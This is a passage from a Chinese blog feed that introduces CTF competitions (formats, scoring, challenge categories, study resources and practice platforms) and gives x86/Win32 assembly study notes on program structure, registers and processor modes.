出题阶段"></a>2.4.2 出题阶段</h4><p>首先各个受邀参赛队伍都必须在正式比赛前出 2 道 Challange。参赛队伍将有 12 周的时间准备 Challenge。出 Challenge 的积分占总分的 30%。</p><p>传统的 BELLUMINAR 赛制要求出的两道 Challenge 中一道 Challenge 必须是在 Linux 平台，另外一个 Challenge 则为非 Linux 平台。两个 Challenge 的类型没有做出限制。因此队伍可以尽情展现自己的技术水平。</p><p>为使比赛 Challenge 类型比较均衡，也有采用队伍抽签出 Challenge 的方式抽取自己的 Challenge，这要求队伍能力水平更为全面，因此为了不失平衡性，也会将两道 Challenge 的计入不同分值（比如要求其中一道 Challenge 分值为 200，而另外一道分值则为 100）。</p><h4 id="2-4-3-提交部署"><a href="#2-4-3-提交部署" class="headerlink" title="2.4.3 提交部署"></a>2.4.3 提交部署</h4><p>题目提交截止之前，各个队伍需要提交完整的文档以及解题 Writeup，文档中要求详细标明题目分值，题面，出题负责人，考察知识点列表以及题目源码。而解题 Writeup 中则需要包含操作环境，完整解题过程以及解题代码。</p><p>题目提交之后主办方会对题目和解题代码进行测试，如果期间出现问题则需要该题负责人配合以解决问题。最终放到比赛平台上。</p><h4 id="2-4-4-解题竞技"><a href="#2-4-4-解题竞技" class="headerlink" title="2.4.4 解题竞技"></a>2.4.4 解题竞技</h4><p>进入比赛后，各支队伍可以看到所有其他团队出的题目并发起挑战，但是不能解答本队出的题目，不设 First Blood 奖励，根据解题积分进行排名。解题积分占总分的 60%。</p><p>比赛结束后，队伍休息，并准备制作分享 PPT（也可以在出题阶段准备好）。分享会时，各队派 2 名队员上台分享出题解题思路，学习过程以及考察知识点等。</p><h4 id="2-4-5-计分规则"><a href="#2-4-5-计分规则" class="headerlink" title="2.4.5 计分规则"></a>2.4.5 计分规则</h4><p>出题积分（占总分 30%）有 50% 由评委根据题目提交的详细程度，完整度，提交时间等进评分，另外 50% 则根据比赛结束后的最终解题情况进行评分。计分公式示例： Score &#x3D; MaxScore – | N – Expect＿N | 。N 代表解出该题的队伍数量，而 Expect＿N 则是这道题预期解出的题目数量。只有当题目难度适中，解题队伍数量越接近预期数量 Expect＿N，则这道题的出题队伍得到的出题积分越高。</p><p>解题积分（占总积分 60%）在计算时不考虑 First Blood 奖励。</p><p>分享积分（占 10%）由评委和其他队伍根据其技术分享内容进行评分得出（考虑分享时间以及其他限制），会计算平均值。</p><h2 id="3-CTF各大题型简介"><a href="#3-CTF各大题型简介" class="headerlink" title="3 CTF各大题型简介"></a>3 CTF各大题型简介</h2><h3 id="3-1-MISC-安全杂项"><a href="#3-1-MISC-安全杂项" class="headerlink" title="3.1 MISC(安全杂项)"></a>3.1 MISC(安全杂项)</h3><p>全称Miscellaneous。题目涉及流量分析、电子取证、人肉搜索、数据分析、大数据统计等等，覆盖面比较广。我们平时看到的社工类题目；给你一个流量包让你分析的题目；取证分析题目，都属于这类题目。主要考查参赛选手的各种基础综合知识，考察范围比较广。</p><h3 id="3-2-REVERSE-逆向"><a href="#3-2-REVERSE-逆向" class="headerlink" title="3.2 REVERSE(逆向)"></a>3.2 REVERSE(逆向)</h3><p>题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译扎实功底。需要掌握汇编，堆栈、寄存器方面的知识。有好的逻辑思维能力。主要考查参赛选手的逆向分析能力。此类题目也是线下比赛的考察重点。</p><h3 id="3-3-WEB-web类"><a href="#3-3-WEB-web类" class="headerlink" title="3.3 WEB(web类)"></a>3.3 WEB(web类)</h3><p>WEB应用在今天越来越广泛，也是CTF夺旗竞赛中的主要题型，题目涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码审计、上传等漏洞。这些题目都不是简单的注入、上传题目，至少会有一层的安全过滤，需要选手想办法绕过。且Web题目是国内比较多也是大家比较喜欢的题目。因为大多数人开始安全都是从web日站开始的。</p><h3 id="3-4-PWN-溢出"><a href="#3-4-PWN-溢出" class="headerlink" title="3.4 PWN(溢出)"></a>3.4 PWN(溢出)</h3><p>PWN在黑客俚语中代表着攻破，取得权限，在CTF比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有栈溢出、堆溢出。在CTF比赛中，线上比赛会有，但是比例不会太重，进入线下比赛，逆向和溢出则是战队实力的关键。主要考察参数选手漏洞挖掘和利用能力。</p><h3 id="3-5-CRYPTO-密码学"><a href="#3-5-CRYPTO-密码学" class="headerlink" title="3.5 CRYPTO(密码学)"></a>3.5 CRYPTO(密码学)</h3><p>全称Cryptography。题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。实验吧“角斗场”中，这样的题目汇集的最多。这部分主要考查参赛选手密码学相关知识点。</p><h3 id="3-6-STEGA-隐写"><a href="#3-6-STEGA-隐写" class="headerlink" title="3.6 STEGA(隐写)"></a>3.6 STEGA(隐写)</h3><p>全称Steganography。题目的Flag会隐藏到图片、音频、视频等各类数据载体中供参赛选手获取。载体就是图片、音频、视频等，可能是修改了这些载体来隐藏flag，也可能将flag隐藏在这些载体的二进制空白位置。有时候需要你侦探精神足够的强，才能发现。此类题目主要考查参赛选手的对各种隐写工具、隐写算法的熟悉程度。实验吧“角斗场”的隐写题目是比较全的，以上说到的都有涵盖。新手们可以从此入门。</p><h3 id="3-7-PPC-编程类"><a href="#3-7-PPC-编程类" class="headerlink" title="3.7 PPC(编程类)"></a>3.7 PPC(编程类)</h3><p>全称Professionally Program Coder。题目涉及到程序编写、编程算法实现。算法的逆向编写，批量处理等，有时候用编程去处理问题，会方便的多。当然PPC相比ACM来说，还是较为容易的。这部分主要考察选手的快速编程能力。</p><h2 id="4-CTF分工合作"><a href="#4-CTF分工合作" class="headerlink" title="4 CTF分工合作"></a>4 CTF分工合作</h2><p><strong>常规方向</strong></p><ul><li><p><strong>A方向：PWN + RE + CRYPTO</strong></p></li><li><p><strong>B方向：WEB + STEGA + MISC</strong></p></li><li><p>MISC，PPC 所有人都需要有一个基本的了解和掌握</p></li></ul><h2 id="5-CTF学习参考"><a href="#5-CTF学习参考" class="headerlink" title="5 CTF学习参考"></a>5 CTF学习参考</h2><h3 id="5-1-知识地图"><a href="#5-1-知识地图" class="headerlink" title="5.1 知识地图"></a>5.1 知识地图</h3><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191014145659.png" srcset="/img/loading.gif"></p><h3 id="5-2-参考书籍"><a href="#5-2-参考书籍" class="headerlink" title="5.2 参考书籍"></a>5.2 参考书籍</h3><ul><li>A方向：<ul><li>逆向工程核心原理</li><li>恶意代码分析实战</li><li>RE for Beginners</li><li>IDA Pro权威指南</li><li>加密与解密</li></ul></li><li>B方向：<ul><li>Web应用安全权威指南</li></ul></li></ul><h3 id="5-3-相关网站"><a href="#5-3-相关网站" class="headerlink" title="5.3 相关网站"></a>5.3 相关网站</h3><h4 id="5-3-1-学习路线"><a href="#5-3-1-学习路线" class="headerlink" title="5.3.1 学习路线"></a>5.3.1 学习路线</h4><ul><li><a href="http://blog.knownsec.com/Knownsec_RD_Checklist/index.html" target="_blank" rel="noopener">知道创宇研发技能表 v3.1</a></li><li><a href="https://skills.bugbank.cn/" target="_blank" rel="noopener">漏洞银行 (BUGBANK) 技能树</a></li><li><a href="http://evilcos.me/security_skill_tree_basic/index.html" target="_blank" rel="noopener">安全技能树简版 by 余弦</a></li><li><a href="https://github.com/phith0n/Mind-Map" target="_blank" rel="noopener">安全类思维导图 by phith0n</a></li><li><a href="https://github.com/riusksk/secbook" target="_blank" rel="noopener">信息安全从业者书单推荐</a></li></ul><h4 id="5-3-2-在线学习"><a href="#5-3-2-在线学习" class="headerlink" title="5.3.2 在线学习"></a>5.3.2 在线学习</h4><ul><li><p><a href="https://adworld.xctf.org.cn/" target="_blank" rel="noopener">攻防世界</a>: 新手入门推荐的刷题网站，包含CTF题型中的大部分</p></li><li><p><a href="http://www.ichunqiu.com/" target="_blank" rel="noopener">i 春秋 - 专业的网络安全 | 信息安全在线学习培训平台</a></p></li><li><p><a href="http://www.shiyanbar.com/" target="_blank" rel="noopener">实验吧－让实验更简单！</a></p></li><li><p><a href="https://www.kanxue.com/chm.htm" target="_blank" rel="noopener">看雪知识库</a></p></li></ul><h4 id="5-3-3-信息资讯"><a href="#5-3-3-信息资讯" class="headerlink" title="5.3.3 信息资讯"></a>5.3.3 信息资讯</h4><ul><li><a href="http://www.freebuf.com/" target="_blank" rel="noopener">FreeBuf.COM | 关注黑客与极客</a></li><li><a href="https://www.anquanke.com/" target="_blank" rel="noopener">安全客 - 有思想的安全新媒体</a></li><li><a href="http://www.4hou.com/" target="_blank" rel="noopener">嘶吼 RoarTalk – 回归最本质的信息安全</a></li><li><a href="https://wiki.ioin.in/" target="_blank" rel="noopener">Sec-News 安全文摘</a></li><li><a href="https://www.freebuf.com/" target="_blank" rel="noopener">互联网安全媒体FreeBuf</a></li><li>知道创宇</li><li>15PB 信息安全教育</li><li>t00ls.net</li></ul><h4 id="5-3-4-技术论坛"><a href="#5-3-4-技术论坛" class="headerlink" title="5.3.4 技术论坛"></a>5.3.4 技术论坛</h4><ul><li><a href="http://www.52pojie.cn/" target="_blank" rel="noopener">吾爱破解</a></li><li><a href="http://bbs.pediy.com/" target="_blank" rel="noopener">看雪论坛</a></li><li><a href="https://xz.aliyun.com/" target="_blank" rel="noopener">先知社区</a></li><li><a href="https://bbs.ichunqiu.com/" target="_blank" rel="noopener">i 春秋论坛</a></li></ul><h4 id="5-3-5-CTF赛事"><a href="#5-3-5-CTF赛事" class="headerlink" title="5.3.5 CTF赛事"></a>5.3.5 CTF赛事</h4><ul><li><a href="https://www.xctf.org.cn/" target="_blank" rel="noopener">XCTF 社区</a>: 全球赛事资讯，积分排名，技术分享</li><li><a href="https://ctftime.org/" target="_blank" rel="noopener">CTFtime</a></li><li><a href="https://ctfrank.org/" target="_blank" rel="noopener">CTF Rank</a></li></ul><h4 id="5-3-6-CTF-OJ"><a href="#5-3-6-CTF-OJ" class="headerlink" title="5.3.6 CTF OJ"></a>5.3.6 CTF OJ</h4><ul><li><a href="http://oj.xctf.org.cn/" target="_blank" rel="noopener">XCTF OJ</a></li><li><a href="https://www.ichunqiu.com/competition" target="_blank" rel="noopener">CTF 大本营</a></li><li><a href="https://pwnhub.cn/index" target="_blank" rel="noopener">pwnhub</a></li><li><a href="http://ctf.nuptsast.com/" target="_blank" rel="noopener">南邮网络攻防训练平台</a></li><li><a href="http://hackinglab.cn/" target="_blank" rel="noopener">HackingLab 网络信息安全攻防学习平台</a></li><li><a href="http://ctf.bugku.com/" target="_blank" rel="noopener">BugkuCTF</a></li><li><a href="https://www.wechall.net/" target="_blank" rel="noopener">WeChall</a></li><li><a href="http://www.sniperoj.com/" target="_blank" rel="noopener">Sniper OJ</a></li><li><a href="https://www.jarvisoj.com/" target="_blank" rel="noopener">Jarvis OJ</a></li><li><a href="https://ctflearn.com/" target="_blank" rel="noopener">CTF Learn</a></li><li><a href="https://hackme.inndy.tw/scoreboard/" target="_blank" rel="noopener">Hackme CTF</a></li><li><a href="http://captf.com/practice-ctf/" target="_blank" rel="noopener">Practice CTF List</a></li></ul><h4 id="5-3-7-本地靶场"><a href="#5-3-7-本地靶场" class="headerlink" title="5.3.7 本地靶场"></a>5.3.7 本地靶场</h4><ul><li>SQLi: <a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></li><li>DVWA: <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a></li><li>metsploitable3: <a href="https://github.com/rapid7/metasploitable3/" target="_blank" rel="noopener">https://github.com/rapid7/metasploitable3/</a></li><li>Webgoat: <a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat</a></li><li>Juiceshop: <a href="https://github.com/bkimminich/juice-shop" target="_blank" rel="noopener">https://github.com/bkimminich/juice-shop</a></li></ul><h4 id="5-3-8-CTF-工具"><a href="#5-3-8-CTF-工具" class="headerlink" title="5.3.8 CTF 工具"></a>5.3.8 CTF 工具</h4><ul><li><a href="https://tools.pediy.com/" target="_blank" rel="noopener">看雪工具</a></li><li><a href="https://down.52pojie.cn/Tools/" target="_blank" rel="noopener">吾爱破解工具</a></li><li><a href="http://ctf.ssleye.com/" target="_blank" rel="noopener">CTF 在线工具 by CTFcode</a></li><li><a href="http://tool.bugku.com/" target="_blank" rel="noopener">CTF 在线工具箱 by bugku</a></li><li><a href="https://ctftools.com/down/" target="_blank" rel="noopener">CTF 工具资源库 by HBCTF team</a></li><li><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">ctf-tools by zardus</a></li><li><a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">The Cyber Swiss Army Knife</a></li></ul><h4 id="5-3-9-CTF-Writup"><a href="#5-3-9-CTF-Writup" class="headerlink" title="5.3.9 CTF Writup"></a>5.3.9 CTF Writup</h4><ul><li><a href="https://github.com/ctfs" target="_blank" rel="noopener">CTFs Writeup 集锦</a></li><li><a href="https://github.com/p4-team/ctf" target="_blank" rel="noopener">CTF solution by p4 team</a></li></ul><h4 id="5-3-10-漏洞复现"><a href="#5-3-10-漏洞复现" class="headerlink" title="5.3.10 漏洞复现"></a>5.3.10 漏洞复现</h4><p>Vulhub: <a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p>]]></content>
    
    
    <categories>
      
      <category>Tutorial</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x86汇编学习笔记(二)</title>
    <link href="/2019/09/30/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/"/>
    <url>/2019/09/30/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="1-win32的汇编开发流程"><a href="#1-win32的汇编开发流程" class="headerlink" title="1 win32的汇编开发流程"></a>1 win32的汇编开发流程</h2><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20190930154636.png" srcset="/img/loading.gif"></p><a id="more"></a><h2 id="2-win32汇编源程序的结构"><a href="#2-win32汇编源程序的结构" class="headerlink" title="2 win32汇编源程序的结构"></a>2 win32汇编源程序的结构</h2><p><strong>Hello world程序在DOS汇编：</strong></p><div class="hljs"><pre><code class="hljs asm">;堆栈段stacksegment stackdb100 dup (?)stack ends;数据段datasegmentszHellodb&apos;Hello, world&apos;,0dh,0ah,&apos;$&apos;dataends;代码段codesegmentassumecs:code,ds:data,ss:stackstart:movax,datamov ds,axmov ah,9mov dx,offset,szHelloint 21hcodeendsendstart</code></pre></div><p><strong>Hello world的Win32程序：</strong></p><div class="hljs"><pre><code class="hljs asm">.386.model flat,stdcalloption casemap:none;include定义includewindows.incinclude user32.incinclude user32.libincludekernel32.incinclude kernel32.lib;数据段.dataszCaptiondb&apos;A MessageBox&apos;,0szTextdb&apos;Hello, world&apos;,0;代码段.codestart:invokeMessageBox, NULL, offset szText, offset szCaption, MB_OKinvoke ExitProcess, NULLend start</code></pre></div><h3 id="2-1-模式定义"><a href="#2-1-模式定义" class="headerlink" title="2.1 模式定义"></a>2.1 模式定义</h3><h4 id="2-1-1-指定使用的指令集"><a href="#2-1-1-指定使用的指令集" class="headerlink" title="2.1.1 指定使用的指令集"></a>2.1.1 指定使用的指令集</h4><p><code>.386</code>是汇编的伪指令，用于告诉编译器在本程序中使用的指令集为80386所拥有的指令集。类似的指令还有：<code>.8086, .186, .386p, .486/486p, .586/.586p</code>等。后面带<strong>p</strong>的伪指令表示程序中可以使用**特权指令(必须在特权级0上运行的指令)**如：<code>mov cr0, eax</code></p><h4 id="2-1-2-model语句"><a href="#2-1-2-model语句" class="headerlink" title="2.1.2 .model语句"></a>2.1.2 .model语句</h4><p>用来定义程序工作的模式。用法如下：</p><p><code>.model 内存模式 [, 语言模式] [, 其他模式]</code></p><table><thead><tr><th>模式</th><th>内存使用方式</th></tr></thead><tbody><tr><td>tiny</td><td>用来建立 .com文件，所有代码、数据和堆栈都在同一个64KB段内</td></tr><tr><td>small</td><td>建立代码和数据分别别用一个64KB段的 .exe文件</td></tr><tr><td>medium</td><td>代码段可以有多个64KB段，数据段只有一个64KB段</td></tr><tr><td>compact</td><td>代码段只有一个64KB段，数据段可以有多个64KB段</td></tr><tr><td>large</td><td>代码段和数据段都可以由多个64KB段</td></tr><tr><td>huge</td><td>同large，并且数据段中的一个数组也可以超过64KB</td></tr><tr><td><strong>flat</strong></td><td><strong>Win32程序使用的模式，代码和数据段使用同一个4GB段</strong></td></tr></tbody></table><p>对于运行在<strong>保护模式</strong>下的win32程序，它只有一种内存模式——flat模式，即每一个应用程序都拥有其相互独立的4GB地址空间。</p><h4 id="2-1-3-option语句"><a href="#2-1-3-option语句" class="headerlink" title="2.1.3 option语句"></a>2.1.3 option语句</h4><p><code>option casemap:none</code>，该语句定义了程序中变量和子程序名是否对大小写敏感。由于Win32 API名称是区分大小写的，故<strong>在win32汇编程序中必须指定此语句</strong>。</p><h3 id="2-2-段的定义"><a href="#2-2-段的定义" class="headerlink" title="2.2 段的定义"></a>2.2 段的定义</h3><h4 id="2-2-1-段的概念"><a href="#2-2-1-段的概念" class="headerlink" title="2.2.1 段的概念"></a>2.2.1 段的概念</h4><p>一个包含全部段的源程序结构：</p><div class="hljs"><pre><code class="hljs asm">.386.model flat, stdcalloption casemap:none&lt;include statements&gt;.stack [堆栈段的大小].data&lt;一些初始化过的变量定义&gt;.data?&lt;一些没有初始化过的变量定义&gt;.const&lt;一些常量定义&gt;.code&lt;代码&gt;&lt;开始标号&gt;&lt;语句&gt;end 开始标号</code></pre></div><ul><li>其中.stack, .data, .data?, .const和.code都是分段伪指令。</li><li>Win32只有代码和数据段之分，因此.data, .data?和.const属于数据段，.code属于代码段。</li><li>与DOS汇编不同，Win32汇编不必考虑堆栈，.stack段定义常常被忽略。</li></ul><h4 id="2-2-2-数据段"><a href="#2-2-2-数据段" class="headerlink" title="2.2.2 数据段"></a>2.2.2 数据段</h4><p>.data，.data?和.const定义在数据段，分别对应不同方式的数据定义，在最后生成的可执行文件中也放置在不同的节区(Section)。程序中的数据定义一般可以归纳为三类：</p><ol><li>可读可写的已定义变量。被定义在.data段，具有以下性质：<ul><li>在源程序已经被定义了初始值。</li><li>具有可读可写性。</li><li>在程序装入完成之后，这些值存在于内存中。</li><li>.data段一般存放在可执行文件的_DATA节区内。</li></ul></li><li>可读可写的未定义变量。可定义在.data段，也可以定义在.data?段，具有以下性质：<ul><li>一般用作缓冲区，或者程序执行后在开始使用。</li><li>若定义在.data段，则编译器在生成可执行文件时会保留声明大小的空间，即使它们是全0</li><li>若定义在.data?段，则编译器在生成可执行文件时只会记录空间大小信息，不会浪费磁盘空间，而是在程序执行时才会用到。</li><li>.data?段在可执行文件中一般放在_BSS节区。</li></ul></li><li>常量。如一些要显示的字符串信息。<ul><li>它们在程序装入时就已经有效，但在整个执行过程中不需要修改。</li><li>具有可读不可写性。</li><li>如果程序对.const段进行写操作，会引起保护错误并结束程序。</li></ul></li></ol><h4 id="2-2-3-代码段"><a href="#2-2-3-代码段" class="headerlink" title="2.2.3 代码段"></a>2.2.3 代码段</h4><ul><li>.code段时代码段，所有的指令都必须写在代码段中</li><li>在可执行文件中，代码段一般放在_TEXT节区。</li><li>Win32环境下的数据段是不可执行的，只有代码段有可执行的属性。（特权级0下运行的程序对所有段有读写权限）</li></ul><h4 id="2-2-4-堆栈段"><a href="#2-2-4-堆栈段" class="headerlink" title="2.2.4 堆栈段"></a>2.2.4 堆栈段</h4><ul><li>Win32程序中不必定义堆栈段，系统会自动分配堆栈空间。</li><li>堆栈段的内存属性是可读写并可执行的。（靠动态修改代码的反跟踪模块可以拷贝到堆栈中边修改边执行）</li></ul><h3 id="2-3-程序入口与结束"><a href="#2-3-程序入口与结束" class="headerlink" title="2.3 程序入口与结束"></a>2.3 程序入口与结束</h3><ul><li>汇编源程序中，并没有main函数来指定开始执行的地方。取而代之的是程序的最后一句的end语句<code>end     [开始地址]</code></li><li>上述语句的开始地址就是源程序从代码段开始执行的地址。</li><li>上述语句同时还表示源程序结束，所有代码都必须在end语句之前。</li><li><strong>多模块程序编写时，单一的模块可以没有入口标号，但是最后把多个模块连接在一起时，必须有一个主模块的入口地址被指明。</strong></li></ul><h2 id="3-API的调用"><a href="#3-API的调用" class="headerlink" title="3 API的调用"></a>3 API的调用</h2><h3 id="3-1-API是什么"><a href="#3-1-API是什么" class="headerlink" title="3.1 API是什么"></a>3.1 API是什么</h3><h3 id="3-2-如何调用"><a href="#3-2-如何调用" class="headerlink" title="3.2 如何调用"></a>3.2 如何调用</h3><h4 id="3-3-1-invoke语句"><a href="#3-3-1-invoke语句" class="headerlink" title="3.3.1 invoke语句"></a>3.3.1 invoke语句</h4><h4 id="3-3-2-函数的声明与返回值"><a href="#3-3-2-函数的声明与返回值" class="headerlink" title="3.3.2 函数的声明与返回值"></a>3.3.2 函数的声明与返回值</h4><h4 id="3-3-3-include语句"><a href="#3-3-3-include语句" class="headerlink" title="3.3.3 include语句"></a>3.3.3 include语句</h4>]]></content>
    
    
    <categories>
      
      <category>Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>x86 Assembly</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x86汇编学习笔记(一)</title>
    <link href="/2019/09/30/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/"/>
    <url>/2019/09/30/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<p>本文主要介绍了80x86的寄存器，80x86处理器的工作模式，Windows的内存管理和寻址方式。</p><a id="more"></a><h2 id="1-80386的寄存器"><a href="#1-80386的寄存器" class="headerlink" title="1 80386的寄存器"></a>1 80386的寄存器</h2><h3 id="1-1-通用寄存器"><a href="#1-1-通用寄存器" class="headerlink" title="1.1 通用寄存器"></a>1.1 通用寄存器</h3><ul><li><strong>EAX:</strong> 通用寄存器。相对其他寄存器，在进行运算方面比较常用。在保护模式中，也可以作为内存偏移指针（此时，DS作为段寄存器或选择器）</li><li><strong>EBX:</strong> 通用寄存器。通常作为内存偏移指针使用（相对于EAX、ECX、EDX）。在保护模式中，同样可以起这个作用。</li><li><strong>ECX:</strong> 通用寄存器。通常用于特定指令的计数。在保护模式中，也可以作为内存偏移指针（此时，DS作为寄存器或段选择器）。</li><li><strong>EDX:</strong> 通用寄存器。在某些运算中作为EAX的溢出寄存器（例如乘、除）。在保护模式中，也可以作为内存偏移指针（此时，DS作为段 寄存器或选择器）。</li></ul><p><strong>注：</strong>以上四个寄存器均为32位，且具有16-bit和8-bit的分组。即我们可以通过AX来访问EAX的低16位，通过AH和AL来访问AX的高8位和低8位。</p><ul><li><strong>ESI:</strong> 通常在内存操作指令中作为“源地址指针”使用。当然，ESI可以被装入任意的数值，但通常没有人把它当作通用寄存器来用。</li><li><strong>EDI:</strong> 通常在内存操作指令中作为“目的地址指针”使用。当然，EDI也可以被装入任意的数值，但通常没有人把它当作通用寄存器来用。</li><li><strong>EBP:</strong> 一个指针的寄存器。通常，它被高级语言编译器用以建造‘堆栈帧’来保存函数或过程的局部变量，不过，还是那句话，你可以在其中保存你希望的任何数据。SS是它的默认段寄存器或选择器。</li></ul><p><strong>注：</strong>以上三个寄存器也是32位寄存器，但是<strong>没有8-bit分组</strong>。</p><h3 id="1-2-段寄存器和选择器"><a href="#1-2-段寄存器和选择器" class="headerlink" title="1.2 段寄存器和选择器"></a>1.2 段寄存器和选择器</h3><ul><li><strong>CS:</strong> 代码段，或代码选择器。同IP寄存器一同指向当前正在执行的那个地址。处理器执行时从这个寄存器指向的段（实模式）或内存（保护模式）中获取指令。除了跳转或其他分支指令之外，你无法修改这个寄存器的内容。</li><li><strong>DS:</strong> 数据段，或数据选择器。这个寄存器的低16 bit连同ESI一同指向的指令将要处理的内存。同时，所有的内存操作指令 默认情况下都用它指定操作段(实模式)或内存(作为选择器，在保护模式)。</li><li><strong>ES:</strong> 附加段，或附加选择器。这个寄存器的低16 bit连同EDI一同指向的指令将要处理的内存。同样的，这个寄存器可以被装入任意数值，方法和DS类似。</li><li>**FS: **F段或F选择器(推测F可能是Free?)。可以用这个寄存器作为默认段寄存器或选择器的一个替代品。它可以被装入任何数值，方法和DS类似。</li><li><strong>GS:</strong> G段或G选择器(G的意义和F一样，没有在Intel的文档中解释)。它和FS几乎完全一样。</li><li><strong>SS:</strong> 堆栈段或堆栈选择器。这个寄存器的低16 bit连同ESP一同指向下一次堆栈操作(push和pop)所要使用的堆栈地址。这个寄存器也可以被装入任意数值，你可以通过入栈和出栈操作来给他赋值，不过由于堆栈对于很多操作有很重要的意义，因此，不正确的修改有可能造成对堆栈的破坏。</li></ul><p><strong>注：</strong>段寄存器和选择器在没有制定的情况下都是使用默认对应的寄存器。</p><h3 id="1-3-特殊寄存器"><a href="#1-3-特殊寄存器" class="headerlink" title="1.3 特殊寄存器"></a>1.3 特殊寄存器</h3><ul><li><strong>EIP:</strong> 一个32位宽的寄存器 ，同CS一同指向即将执行的那条指令的地址。不能够直接修改这个寄存器的值，修改它的唯一方法是跳转或分支指令。(CS是默认的段或选择器)</li><li><strong>ESP:</strong> 这个32位寄存器指向<strong>堆栈</strong>中<strong>即将被操作的那个地址</strong>。尽管可以修改它的值，然而并不提倡这样做，因为如果你不是非常明白自己在做什么，那么你可能造成堆栈的破坏。对于绝大多数情况而言，这对程序是致命的。(SS是默认的段或选择器)</li></ul><h3 id="1-4-其他寄存器"><a href="#1-4-其他寄存器" class="headerlink" title="1.4 其他寄存器"></a>1.4 其他寄存器</h3><p><em>以下寄存器均为32位</em></p><ul><li><strong>CR0, CR2, CR3:</strong> 控制寄存器。其中CR0的作用是切换实模式和保护模式</li><li><strong>D0, D1, D2, D3, D6, D7:</strong> 调试寄存器。可以作为调试器的硬件支持来设置条件断点</li><li><strong>TR3, TR4, TR5, TR6:</strong> 测试寄存器。用于某些条件测试</li></ul><h2 id="2-80x86的工作模式"><a href="#2-80x86的工作模式" class="headerlink" title="2 80x86的工作模式"></a>2 80x86的工作模式</h2><p>80386处理器由三个工作模式：实模式，保护模式和虚拟86模式。实模式和虚拟86模式都是为了和8086处理器<strong>兼容</strong>而设置的。</p><h3 id="2-1-实模式"><a href="#2-1-实模式" class="headerlink" title="2.1 实模式"></a>2.1 实模式</h3><ul><li>80386处理器被复位或加电的时候以实模式启动。这时候处理器中的各寄存器以实模式的初始化值工作。</li><li>80386处理器在实模式下的存储器寻址方式和8086是一样的：由段寄存器的内容乘以16当作基地址，加上段内的偏移地址形成最终的物理地址。<strong>（32位地址线只用了20位，即1MB）</strong>。</li><li>实模式下80386处理器不能对内存进行分页管理，所以指令寻址的地址就是<strong>内存的实际地址</strong>。</li><li>实模式下，所有的段都是可读写和执行的。</li><li>实模式下的80386不支持优先级，所有的指令相当于工作在特权级（优先级0），所以它可以执行所有的特权指令。<strong>实际上，80386就是通过在实模式下初始化控制寄存器，GDTR，LDTR, IDTR与TR等管理寄存器以及页表，然后再通过加载CR0使其中的保护模式使能位置位而进入保护模式的。</strong></li><li>实模式下中断处理方式和80386处理器相同。也是用中断向量表来定位中断服务程序地址。中断向量表的结构也和8086处理器一样：每4个字节组成一个中断向量，其中包括两个字节的段地址和2个字节的偏移地址。</li></ul><h3 id="2-2-保护模式"><a href="#2-2-保护模式" class="headerlink" title="2.2 保护模式"></a>2.2 保护模式</h3><ul><li>当80386处理器工作在保护模式时，其所有功能都是可用的。</li><li>80386所有的32根地址线都可提供寻址，物理寻址空间达<strong>4GB</strong></li><li>保护模式下，支持内存分页机制，提供了对虚拟内存的良好支持。</li><li>保护模式下，支持多任务。仅依靠硬件即可再一条指令中实现任务切换。任务环境的保护工作是由处理器自动完成的。</li><li>保护模式下，80386处理器还支持<strong>优先级机制</strong>。优先级分为4个（0级到3级），操作系统运行在最高优先级0级上。应用程序则运行在较低优先级上。配合良好的检查机制后，即可实现多任务的数据安全共享，也能够很好地隔离各个任务。</li><li>实模式切换到保护模式是通过修改**控制寄存器CR0的控制位PE(位0)**实现的。在此之前，需要建立保护模式必须的数据表，如全局描述表GDT和中断描述表IDT等。</li><li><strong>DOS操作系统运行于实模式下，而Windows操作系统运行于保护模式下。</strong></li></ul><h3 id="2-3-虚拟86模式"><a href="#2-3-虚拟86模式" class="headerlink" title="2.3 虚拟86模式"></a>2.3 虚拟86模式</h3><ul><li>虚拟86模式是为了在保护模式下执行8086程序而设置的。（实模式的兼容做得并不足够）</li><li>虚拟86模式是以<strong>任务形式</strong>在保护模式上执行的。在80386上可以<strong>同时支持</strong>由多个真正的80386任务和虚拟86模式构成的任务。</li><li>虚拟86模式支持任务切换机制。在Windows操作系统中，有一部分程序专门用来管理虚拟86模式的任务，成为<strong>虚拟86管理程序</strong></li><li>虚拟86模式采用和8086一样的寻址方式：即用段寄存器乘以16当作基址在加上偏移地址。寻址空间为<strong>1MB</strong>。</li><li>虚拟86模式支持内存分页机制，因此能够很好地解决不同虚拟86任务的地址空间问题，通过分页机制的地址映射，让<strong>每个任务都认为自己在使用0~1MB的地址空间</strong>。</li><li>8086有部分指令在保护模式下属于特权指令，如屏蔽中断的cli和中断返回指令iret等。为了让8086的代码能够正常执行，虚拟86管理程序<strong>采用模拟</strong>的方式来完成这些指令：这些指令首先会引起保护异常，虚拟86程序则在异常处理程序中检查这些指令，并做出合理的响应。MS-DOS应用程序在Windows操作系统就是这样工作的。</li></ul><h2 